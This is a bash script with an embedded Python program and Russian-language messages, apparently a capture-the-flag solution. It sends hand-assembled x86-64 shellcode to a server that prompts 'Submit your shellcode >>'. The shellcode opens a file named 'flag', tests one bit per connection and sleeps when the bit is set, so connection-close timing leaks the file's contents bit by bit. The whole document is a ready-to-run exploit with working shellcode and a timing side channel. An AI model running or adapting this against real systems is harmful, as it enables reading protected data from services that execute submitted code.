#!/usr/bin/env bash
set -euo pipefail
command -v python3 >/dev/null || { printf 'Ошибка: нужен python3\n' >&2; exit 1; }
read -r -p 'Адрес сервера (ip:port): ' target
python3 - "$target" <<'PY'
import socket, struct, sys, time

try:
    HOST, port_text = sys.argv[1].rsplit(':', 1)
    PORT = int(port_text)
    if not HOST or not 1 <= PORT <= 65535:
        raise ValueError
except ValueError:
    sys.exit('Укажи адрес в формате ip:port (например, 127.0.0.1:40000).')

PROMPT = b'Submit your shellcode >>'
TIMEOUT = 8.0
DELAY_NS = 400_000_000

def padded(code):
    if len(code) > 1024:
        raise ValueError('Shellcode длиннее 1024 байт')
    return code.ljust(1024, b'A')

def exit_code():
    return padded(bytes.fromhex('31ff b83c000000 0f05'))

def nap_code():
    # timespec {0, 400000000}, nanosleep(&timespec, NULL), exit(0)
    return padded(bytes.fromhex('4883ec10 31c0 48890424 c7442408')
                  + struct.pack('<I', DELAY_NS)
                  + bytes.fromhex('4889e7 31f6 b823000000 0f05')
                  + bytes.fromhex('31ff b83c000000 0f05'))

def shellcode(index, bit):
    b = bytearray()
    b += bytes.fromhex('31c050') + b'\x68flag'
    b += bytes.fromhex('4889e7 31f6 b002 0f05 89c7')
    b += bytes.fromhex('4881ec') + struct.pack('<I', max(4096, index+256))
    b += bytes.fromhex('31c0 4889e6 ba') + struct.pack('<I', index+1) + bytes.fromhex('0f05')
    b += bytes.fromhex('3d') + struct.pack('<I', index+1)
    jae = len(b); b += b'\x73\x00'
    b += b'\xbf\x02\x00\x00\x00'
    jmp = len(b); b += b'\xeb\x00'
    success = len(b)
    b += bytes.fromhex('0fb68424') + struct.pack('<I', index)
    b += bytes.fromhex('c1e8') + bytes([bit]) + bytes.fromhex('a801')
    jz = len(b); b += b'\x74\x00'
    b += bytes.fromhex('4883ec10 31c0 48890424 c7442408') + struct.pack('<I', DELAY_NS)
    b += bytes.fromhex('4889e7 31f6 b823000000 0f05')
    end = len(b)
    b += bytes.fromhex('31ff b83c000000 0f05')
    for at, dest in ((jae, success), (jmp, end), (jz, end)):
        offset = dest - at - 2
        if not -128 <= offset <= 127:
            raise ValueError('Jump out of range')
        b[at+1] = offset & 255
    return padded(b)

def query(payload):
    try:
        with socket.create_connection((HOST, PORT), timeout=TIMEOUT) as sock:
            sock.settimeout(TIMEOUT)
            banner = b''
            while PROMPT not in banner:
                chunk = sock.recv(4096)
                if not chunk:
                    raise RuntimeError('Сервер закрыл соединение до приглашения')
                banner += chunk
                if len(banner) > 65536:
                    raise RuntimeError('Неожиданный ответ сервера (приглашение не найдено)')
            start = time.monotonic()
            sock.sendall(payload)
            try:
                sock.shutdown(socket.SHUT_WR)
            except OSError:
                pass
            while sock.recv(4096):
                pass
            return time.monotonic() - start
    except socket.timeout as exc:
        raise RuntimeError('Сервер не завершил TCP-сессию за '
                           f'{TIMEOUT:g} с после передачи 1024 байт. '
                           'Временной канал на основе закрытия соединения недоступен.') from exc
    except OSError as exc:
        raise RuntimeError(f'Сетевая ошибка: {exc}') from exc

try:
    print('Проверка: exit без задержки...', flush=True)
    t0 = query(exit_code())
    print(f'  {t0:.3f} с')
    print('Проверка: nanosleep + exit...', flush=True)
    t1 = query(nap_code())
    print(f'  {t1:.3f} с')
    delta = t1 - t0
    if delta < DELAY_NS/1e9 * .4:
        sys.exit('Ошибка: задержка nanosleep не обнаружена; '
                 'извлечение по времени недостоверно (возможен seccomp или прокси).')
    threshold = (t0+t1)/2
    print(f'Канал работает, порог {threshold:.3f} с. Чтение flag...', flush=True)
    result = bytearray()
    for pos in range(256):
        value = 0
        for bit in range(8):
            if query(shellcode(pos, bit)) > threshold:
                value |= 1 << bit
        if value == 0:
            break
        result.append(value)
        print('\r' + result.decode('utf-8', 'backslashreplace'), end='', flush=True)
        if value == ord('}') and b'{' in result:
            break
    print('\nФлаг:', result.decode('utf-8', 'backslashreplace'))
except (RuntimeError, ConnectionError) as exc:
    sys.exit(f'Ошибка: {exc}\nНужно проверить, действительно ли сервер запускает shellcode '
             'и закрывает соединение после exit.')
except KeyboardInterrupt:
    sys.exit('\nОстановлено пользователем')
PY
